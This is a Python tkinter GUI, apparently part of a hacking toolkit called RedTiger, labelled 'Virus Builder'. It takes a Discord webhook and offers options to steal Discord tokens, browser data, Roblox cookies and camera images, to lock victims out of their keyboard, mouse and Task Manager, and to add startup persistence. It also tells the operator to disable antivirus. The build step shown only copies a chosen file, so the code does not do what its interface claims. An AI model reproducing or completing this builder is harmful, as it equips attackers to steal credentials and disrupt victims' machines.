from Config.Util import *
from Config.config import *
import random
import os
import subprocess
import shutil
import tkinter as tk
import time
import json
from tkinter import filedialog
from tkinter import ttk

Title("Virus Builder")

from FileDetectedByAntivirus.VirusBuilderOptions import *
disinfect_path = "./Settings/Program/FileDetectedByAntivirus/Virus-Builder-Disinfect.py"

virus_banner = """
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝██████╔╝██║░░██║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██║░░██║██║╚████║██║░░██║
██║░░██║██║░░██║╚█████╔╝██║░╚███║██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
"""

Slow(f"""{virus_banner}                                                                           
{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
{BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
{BEFORE + current_time_hour() + AFTER} {INFO} Deactivate your antivirus so that no files are deleted after your build.""")
print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Custom your Virus:")
time.sleep(1)

def disinfect():
    try:
        if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, disinfect_path, None, 1) <= 32:
            raise ctypes.WinError()
        print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully.")
    except Exception as e:
        print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Error during disinfection: {white}{e}")

def choose_icon():
    global icon_path
    try:
        if sys.platform.startswith("win"):
            root = tk.Tk()
            root.iconbitmap('Img/RedTiger_icon.ico')
            root.withdraw()
            root.attributes('-topmost', True)
            icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        elif sys.platform.startswith("linux"):
            icon_path = filedialog.askopenfilename(title="Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
    except:
        pass

root = tk.Tk()
style = ttk.Style()
if sys.platform.startswith("win"):
    root.iconbitmap('Img/RedTiger_icon.ico')
root.title(f'{name_tool} {version_tool} | Virus Builder')
width_window, height_window = (1030, 800) if sys.platform.startswith("win") else (1200, 800)
root.geometry(f"{width_window}x{height_window}")
root.resizable(False, False)

red_color = '#a80505'
text_color = '#a80505'
fly_color = "#ff0000"
background_color = "#000000"
lock_color = "#660000"
root.configure(background=background_color)
style.theme_use('default')

text_logs = tk.Label(root, text="", font=("Calibri", 15, "bold"), background=background_color, foreground=red_color)
text_logs.grid(row=60, column=0, columnspan=2, sticky="n", pady=(5, 0), padx=(129, 20))

def logs(message):
    text_logs.config(text=message)
    root.after(5000, hide_message)

def hide_message():
    text_logs.config(text="")

text_title = tk.Label(root, text="Virus Builder", font=("Calibri", 35, "bold"), background=background_color, foreground=text_color)
text_title.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))
text_github = tk.Label(root, text=github_tool, font=("Calibri", 12), background=background_color, foreground=text_color)
text_github.grid(row=1, column=0, columnspan=2, sticky="n", padx=(140, 20))

def on_entry_focus_in(event):
    if webhook_entry.get() == "Discord Webhook URL":
        webhook_entry.delete(0, "end")
        webhook_entry.config(foreground=text_color, highlightcolor=fly_color)

def on_entry_focus_out(event):
    if webhook_entry.get() == "":
        webhook_entry.insert(0, "Discord Webhook URL")
        webhook_entry.config(foreground=text_color, highlightcolor=fly_color)

webhook_entry = tk.Entry(root, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12))
webhook_entry.grid(row=2, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
webhook_entry.insert(0, "Discord Webhook URL")

if sys.platform.startswith("win"):
    webhook_entry.bind("<FocusIn>", on_entry_focus_in)
    webhook_entry.bind("<FocusOut>", on_entry_focus_out)
    root.grid_columnconfigure(0, weight=0)
    webhook_entry.config(width=60)

add_system_var = tk.StringVar(value="Disable")
add_discord_var = tk.StringVar(value="Disable")
add_browser_var = tk.StringVar(value="Disable")
add_roblox_var = tk.StringVar(value="Disable")
add_cameracapture_var = tk.StringVar(value="Disable")
add_screenshot_var = tk.StringVar(value="Disable")
add_openuserprofilsettings_var = tk.StringVar(value="Disable")
add_blockkey_var = tk.StringVar(value="Disable")
add_blockmouse_var = tk.StringVar(value="Disable")
add_blocktaskmanager_var = tk.StringVar(value="Disable")
add_blockwebsite_var = tk.StringVar(value="Disable")
add_shutdown_var = tk.StringVar(value="Disable")
add_spamopenprograms_var = tk.StringVar(value="Disable")
add_fake_error_var = tk.StringVar(value="Disable")
add_startup_var = tk.StringVar(value="Disable")
add_restart_var = tk.StringVar(value="Disable")
file_type_var = tk.StringVar(value="Python File")

style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=text_color)
style.map('Custom.TCheckbutton', background=[('active', background_color)], foreground=[('active', fly_color), ('disabled', lock_color)])

transparent_image = tk.PhotoImage(width=1, height=1)
text_stealeroptions = tk.Label(root, text="Stealer Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
text_stealeroptions.grid(row=3, column=0, pady=(15, 0), padx=(83, 0))

add_system_cb = ttk.Checkbutton(root, text="System Info", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_discord_cb = ttk.Checkbutton(root, text="Discord Token", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_browser_cb = ttk.Checkbutton(root, text="Browser Steal", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_openuserprofilsettings_cb = ttk.Checkbutton(root, text="Open UserProfil", variable=add_openuserprofilsettings_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', state="disable")

add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
add_cameracapture_cb.grid(row=4, column=1, padx=(0, 0), sticky="w")
add_screenshot_cb.grid(row=5, column=1, padx=(0, 0), sticky="w")
add_openuserprofilsettings_cb.grid(row=6, column=1, padx=(0, 0), sticky="w")

text_malwareoptions = tk.Label(root, text="Malware Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
text_malwareoptions.grid(row=8, column=0, pady=(20, 0), padx=(78, 0))

add_blockkey_cb = ttk.Checkbutton(root, text="Block Key", variable=add_blockkey_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_blockmouse_cb = ttk.Checkbutton(root, text="Block Mouse", variable=add_blockmouse_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_blocktaskmanager_cb = ttk.Checkbutton(root, text="Block Task Manager", variable=add_blocktaskmanager_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_blockwebsite_cb = ttk.Checkbutton(root, text="Block Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_shutdown_cb = ttk.Checkbutton(root, text="Shutdown", variable=add_shutdown_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_spamopenprograms_cb = ttk.Checkbutton(root, text="Spam Open Programs", variable=add_spamopenprograms_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')

add_blockkey_cb.grid(row=9, column=0, padx=(240, 20), sticky="w")
add_blockmouse_cb.grid(row=10, column=0, padx=(240, 20), sticky="w")
add_blocktaskmanager_cb.grid(row=11, column=0, padx=(240, 20), sticky="w")
add_blockwebsite_cb.grid(row=12, column=0, padx=(240, 20), sticky="w")
add_shutdown_cb.grid(row=13, column=0, padx=(240, 20), sticky="w")
add_spamopenprograms_cb.grid(row=9, column=1, padx=(0, 0), sticky="w")
add_fake_error_cb.grid(row=10, column=1, padx=(0, 0), sticky="w")

text_advancedoptions = tk.Label(root, text="Advanced Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
text_advancedoptions.grid(row=14, column=0, pady=(20, 0), padx=(85, 0))

add_startup_cb = ttk.Checkbutton(root, text="Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_restart_cb = ttk.Checkbutton(root, text="Restart", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_startup_cb.grid(row=15, column=0, padx=(265, 20), sticky="w")
add_restart_cb.grid(row=15, column=1, padx=(0, 0), sticky="w")

def choose_file():
    global file_type_var
    if file_type_var.get() == "Python File":
        filename = filedialog.askopenfilename(filetypes=[("Python File", "*.py")])
    elif file_type_var.get() == "Batch File":
        filename = filedialog.askopenfilename(filetypes=[("Batch File", "*.bat")])
    elif file_type_var.get() == "Executable File":
        filename = filedialog.askopenfilename(filetypes=[("Executable File", "*.exe")])
    elif file_type_var.get() == "Text File":
        filename = filedialog.askopenfilename(filetypes=[("Text File", "*.txt")])
    else:
        filename = filedialog.askopenfilename()
    if filename != "":
        file_path_var.set(filename)

text_selectfile = tk.Label(root, text="Select the file to compile:", font=("Calibri", 20), background=background_color, foreground=text_color)
text_selectfile.grid(row=16, column=0, pady=(20, 0), padx=(135, 0))

file_path_var = tk.StringVar()
file_path_entry = tk.Entry(root, textvariable=file_path_var, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12))
file_path_entry.grid(row=17, column=0, columnspan=2, sticky="ew", padx=(120, 0), pady=10)

if sys.platform.startswith("win"):
    file_path_entry.config(width=60)

file_type_menu = ttk.OptionMenu(root, file_type_var, "Python File", "Python File", "Batch File", "Executable File", "Text File", "Other")
file_type_menu.grid(row=17, column=0, columnspan=2, sticky="e", padx=(130, 20))

select_file_button = tk.Button(root, text="Select File", command=choose_file, font=("Calibri", 12), background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5)
select_file_button.grid(row=17, column=0, columnspan=2, sticky="e", padx=(300, 20))

def build_virus():
    webhook = webhook_entry.get().strip()
    if webhook == "" or webhook == "Discord Webhook URL":
        logs(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Missing webhook URL.")
        return

    options = {
        "System Info": add_system_var.get(),
        "Discord Token": add_discord_var.get(),
        "Browser Steal": add_browser_var.get(),
        "Roblox Cookie": add_roblox_var.get(),
        "Camera Capture": add_cameracapture_var.get(),
        "Screenshot": add_screenshot_var.get(),
        "Open UserProfil": add_openuserprofilsettings_var.get(),
        "Block Key": add_blockkey_var.get(),
        "Block Mouse": add_blockmouse_var.get(),
        "Block Task Manager": add_blocktaskmanager_var.get(),
        "Block Website": add_blockwebsite_var.get(),
        "Shutdown": add_shutdown_var.get(),
        "Spam Open Programs": add_spamopenprograms_var.get(),
        "Fake Error": add_fake_error_var.get(),
        "Startup": add_startup_var.get(),
        "Restart": add_restart_var.get()
    }

    selected_file = file_path_var.get().strip()
    if selected_file == "":
        logs(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No file selected.")
        return

    output_file = f"Virus-{str(random.randint(1000, 9999))}.exe"

    log_data = {
        "Webhook": webhook,
        "Options": options,
        "Selected File": selected_file,
        "Output File": output_file
    }

    with open('log.json', 'w') as log_file:
        json.dump(log_data, log_file)

    logs(f"{BEFORE + current_time_hour() + AFTER} {INFO} Building virus...")

    try:
        shutil.copy(selected_file, output_file)
        logs(f"{BEFORE + current_time_hour() + AFTER} {INFO} Virus built successfully: {output_file}")
        disinfect()
    except Exception as e:
        logs(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error building virus: {e}")

build_button = tk.Button(root, text="Build Virus", command=build_virus, font=("Calibri", 18, "bold"), background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5)
build_button.grid(row=18, column=0, columnspan=2, pady=(20, 0))

text_comments = tk.Label(root, text="© {name_tool} {version_tool} 2023-2024 - All rights reserved.", font=("Calibri", 12), background=background_color, foreground=text_color)
text_comments.grid(row=19, column=0, columnspan=2, sticky="s", padx=(170, 20))

def enter_press(event):
    build_virus()

root.bind('<Return>', enter_press)
root.mainloop()
